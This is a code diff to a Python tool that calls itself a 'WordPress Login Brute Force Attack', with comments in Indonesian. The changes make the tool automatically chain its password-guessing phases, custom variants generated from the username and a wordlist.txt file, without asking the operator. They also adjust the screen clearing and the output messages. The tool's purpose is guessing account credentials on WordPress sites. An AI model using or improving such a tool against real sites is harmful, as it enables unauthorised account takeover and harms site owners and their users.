@@ -252,8 +252,8 @@ class BruteForceThread:
             return False
 
 def main():
-    os.system('clear')
-    print(CCY + """
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(CCY + r"""
   _____            _     
  | ____|_   ____ _| |    
  |  _| \ \ / / _` | |       WordPress Login Brute Force Attack
@@ -336,32 +336,33 @@ def main():
             
             found = brute.brute_force(custom_passwords, "CUSTOM WORDLIST")
             
-            # Jika gagal dan wordlist tersedia, tawarkan untuk mencoba wordlist
+            # Jika gagal dan username benar, langsung lanjut ke wordlist.txt
             if not found and not brute.wrong_user:
-                try_wordlist = input(f"\n{CCY}Try wordlist.txt? {CYL}[y/n, Default: y]{CEN}: ").strip().lower() or "y"
-                if try_wordlist == "y":
+                # Cek apakah wordlist sudah dibaca
+                if not wordlist_available:
                     wordlist_passwords, wordlist_available = read_wordlist("wordlist.txt")
-                    if wordlist_available and wordlist_passwords:
-                        brute.found = False
-                        brute.password_found = None
-                        brute.wrong_user = False
-                        found = brute.brute_force(wordlist_passwords, "WORDLIST.TXT")
+                
+                if wordlist_available and wordlist_passwords:
+                    print(f"\n{CCY}[i]{CEN} {CWH}Continuing to wordlist.txt phase...{CEN}")
+                    brute.found = False
+                    brute.password_found = None
+                    brute.wrong_user = False
+                    found = brute.brute_force(wordlist_passwords, "WORDLIST.TXT")
         
         elif attack_option == "w":
             # Try wordlist.txt passwords
             if wordlist_available and wordlist_passwords:
                 found = brute.brute_force(wordlist_passwords, "WORDLIST.TXT")
             
-            # Jika gagal, tawarkan untuk mencoba custom wordlist
+            # Jika gagal dan username benar, langsung lanjut ke custom wordlist
             if not found and not brute.wrong_user:
-                try_custom = input(f"\n{CCY}Try custom wordlist? {CYL}[y/n, Default: y]{CEN}: ").strip().lower() or "y"
-                if try_custom == "y":
-                    custom_passwords = generate_custom_wordlist([username])
-                    print(f"{CCY}[i]{CEN} Generated {CYL}{len(custom_passwords)}{CEN} password variants")
-                    brute.found = False
-                    brute.password_found = None
-                    brute.wrong_user = False
-                    found = brute.brute_force(custom_passwords, "CUSTOM WORDLIST")
+                print(f"\n{CCY}[i]{CEN} {CWH}Continuing to custom wordlist phase...{CEN}")
+                custom_passwords = generate_custom_wordlist([username])
+                print(f"{CCY}[i]{CEN} Generated {CYL}{len(custom_passwords)}{CEN} password variants")
+                brute.found = False
+                brute.password_found = None
+                brute.wrong_user = False
+                found = brute.brute_force(custom_passwords, "CUSTOM WORDLIST")
         
         if not found and not brute.wrong_user:
             print(f"\n{CRE}[-] No password found for {username}{CEN}")
@@ -371,9 +372,9 @@ def main():
     elapsed_time = time.time() - start_time
     
     if found:
-        print(f"{CHE}[✓] Attack completed successfully{CEN}")
+        print(f"\n{CHE}[✓] Attack completed successfully{CEN}")
     else:
-        print(f"{CRE}[✗] No valid credentials found{CEN}")
+        print(f"\n{CRE}[✗] No valid credentials found{CEN}")
     print(f"{CCY}[x] Total time: {elapsed_time:.2f} seconds{CEN}")
     print(f"{CCY}[x] Attempted {len(usernames)} username(s){CEN}")
 
